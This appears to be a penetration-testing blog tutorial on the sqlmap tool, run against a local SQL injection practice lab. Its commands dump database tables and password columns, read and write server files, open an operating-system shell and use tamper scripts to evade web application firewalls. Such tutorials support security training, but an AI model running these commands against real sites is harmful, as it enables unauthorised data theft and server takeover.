---
title: SQLMap Like a Pro
author: 0xUN7H1NK4BLE
date: January 30 2020
categories: [hacking, bugbouty]
tags: [SQLMap, Penetration Testing]
---

SQLmap like a pro…
==================

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

SQLmap is pre-install in Kali Linux. And if you want to install it yourself follow

[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

```
sqlmap
``````
You will get a prompt if you have a sqlmap install.

```
sqlmap -h
```
This will give you a help menu.
![alt text](/assets/img/image.png)

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1
```

This is how we scan for a SQL injection in a endpoint parameter where -u is use to give the URL.


Technique
=========

There are many techniques we could use to find SQL injection these are boolean-based, Error-based, Union-queries, time-based, and inline queries. To know more about them in depth you could find them here [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection).

These are the technique you could use for SQL injection in sqlmap i.e.

| Letter | Letter Technique                           |
|--------|--------------------------------------------|
| B      | Boolean-based blind or simply blind injection |
| E      | Error-based injection                      |
| U      | UNION-query based                          |
| S      | Stacked queries                            |
| T      | Time-based injection                       |
| Q      | Inline queries                             |


```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 --technique=B --dbms=MySQL --level=1 --risk=1
```

You can use specific techniques using --technique=`<prefer letter of technique>`.

Some sqlmap commands with their uses are listed below:

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 --current-user
```

To find the database’s current user we can use — current-user argument.

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 --dbs
```

We can use — dbs parameter to find all the databases present.

---

How to dump the table?

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 -D <databasename> --tables
```

We can use — tables argument to list all the tables in a database given.

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 -D <databasename> -T <table name> --dump
```

To dump the table of a given database we can use — dump with -T and -D where T stands for table name and D stands for the Database name.

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 -D <databasename> -T <table name> --columns
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 -D <databasename> -T <table name> -C "username,password" --dump
```

We can also dump specific columns for that first we need to find the columns’ names using — columns and after that, we can use -C argument to supply the column name.

There is an easy way to use sqlmap this is mostly focused on new users and the argument for this is — wizard.

```
sqlmap --wizard
```

This will help us use sqlmap in an easy way.

```
sqlmap -u <http://10.0.2.15/sql/Less-1/?id=1 --dump-all
```

We can also use — dump-all to dump everything but this will take a long time and is not suggested.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --batch
```

we can also use — batch parameters to use the default value and don’t ask for user input.

Multi-threading
===============

threads

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 -D <database> --dump --threads 4
```

-threads is used to give max number of concurrent HTTP(s) requests.

Null connection

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 -D <database> --dump --null-connection
```

— null-connection is used to try to retrieve data without a full load of HTML.

keep alive

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 -D <database> --dump --keep-alive
```

— keep-alive is used for persistent HTTP(s) connection.

predict-output

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 -D <database> --dump --predict-output
```

— predict-output is used for predicting common query output.

Finally, we can use -o to turn on all optimization switches.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 -D <database> --dump -o
```

---

read and write file
===================

We can use sqlmap to read and write files in that system so, for this, we should first check for the privileges.

We can do so using — privileges parameter.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --privileges
```

And if we have privileges we can use — file-read and the name of the file with its location to read it.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --file-read=c:/xampp/htdocs/index.php
```

We can also write using sqlmap if we have write privileges with — file-write with the location of the file and — file-dest to give the destination where you want to write.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --file-write=/home/an/hi --file-dest=c:/xampp/htdocs/test
```

Post request
============

We can also try sql injection in post request for this we have to supply data with the — data parameter and we can use -p to supply a parameter where we want to try SQL injection.

```
sqlmap  -u <http://10.0.2.15/sql/Less-11/ --data="uname=test'&passwd=&submit=Submit" -p uname
```

We can also try SQL injection in post-request using the post-request file which we could get using the burp suite.

first, save the request in a file then…

we could just use -r for the request filename.

```
sqlmap -r filename -p uname
```

Operating System Takeover
=========================

We can use the — os-cmd parameter with the command you want to run.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --os-cmd=whoami
```

In sqlmap we can get os shell also for that we have to use — os-shell parameter.

```
sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --os-shell
```

We can also prompt os shell in Metasploit and direct shell also using — os-pwn.

```
sudo sqlmap -u <http://10.0.2.15/sql/Less-9/?id=2 --os-pwn
```

Bypass Web Application Firewall
===============================

Sometimes we have to encode the payload or are blocked by a firewall in this case we could use tampers.

there are different tampers we can use — list-tampers to list the with their description.

```
sqlmap --list-tampers
```
![alt text](/assets/img/image1.png)

We then can use the required tamper using — tamper and supply required name.

```
sqlmap -u <http://10.0.2.15/sql/Less-30/?id=2 --level 2 --risk 2 --tamper=charencode.py -v 4
```

If you want to practice SQL injection

[SQL Lab](https://github.com/Audi-1/sqli-labs?source=post_page-----6be3d8f81077--------------------------------)

This is a great resource.

Finally, a pro tips for a bug hunter:

![Bug hunter](https://miro.medium.com/v2/resize:fit:600/format:webp/1*aqRiN1x3_L0NX0ZSIWc_fA.png)

We can use sqlmap in burp suite which will increase your productivity.

